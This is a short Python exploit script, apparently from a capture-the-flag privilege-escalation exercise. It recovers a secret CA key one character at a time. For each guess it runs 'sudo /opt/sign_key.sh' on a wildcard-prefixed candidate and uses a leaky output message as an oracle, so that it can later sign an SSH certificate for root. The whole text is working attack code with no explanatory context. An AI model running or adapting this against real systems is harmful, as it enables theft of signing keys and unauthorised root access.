import string
import subprocess
s = string.ascii_letters+'+'+'-'+'\n'+' '+'/'+'='+string.digits
strlist = "-"

while True:
    for i in s:
        alist = i+strlist
        clist = '*'+alist
        with open("testca", "w") as wr:
            wr.write(clist)
        a=subprocess.run(f'sudo /opt/sign_key.sh ./testca test.pub root root_user 1', shell=True, stdout=subprocess.PIPE, text=True)
        if 'Use API for signing with this CA' in a.stdout:
            strlist = alist
            print(strlist)
            break
